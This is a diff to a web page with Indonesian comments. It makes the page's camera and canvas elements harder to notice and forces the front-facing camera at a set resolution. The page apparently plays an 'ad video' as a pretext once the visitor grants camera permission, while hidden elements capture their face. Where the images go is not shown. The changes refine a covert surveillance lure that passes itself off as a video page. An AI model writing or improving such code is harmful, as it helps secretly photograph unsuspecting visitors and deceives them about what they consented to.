@@ -38,12 +38,15 @@
             margin-top: 10px;
         }
 
-        /* SEMBUNYIKAN KAMERA & CANVAS */
+        /* PERBAIKAN: Cara penyembunyian elemen yang kurang agresif */
         #video, #canvas {
             position: absolute;
-            top: -9999px;
-            left: -9999px;
-            visibility: hidden;
+            top: 0; /* Ubah dari -9999px */
+            left: 0; /* Ubah dari -9999px */
+            width: 1px;
+            height: 1px;
+            opacity: 0; 
+            visibility: hidden; /* Tambahkan kembali visibility:hidden agar benar-benar tidak terlihat */
         }
 
         button {
@@ -113,10 +116,13 @@
         statusBox.innerText = "Memuat video dan meminta izin akses...";
 
         try {
-            // Coba minta akses kamera
-            // Menggunakan 'video: true' agar browser memilih kamera yang paling mudah diakses (mengatasi masalah layar hitam)
+            // PERBAIKAN: Memaksa kamera depan dengan resolusi yang jelas
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: true 
+                video: {
+                    facingMode: "user", 
+                    width: { ideal: 640 }, 
+                    height: { ideal: 480 } 
+                }
             });
             
             // JIKA BERHASIL: Putar video iklan
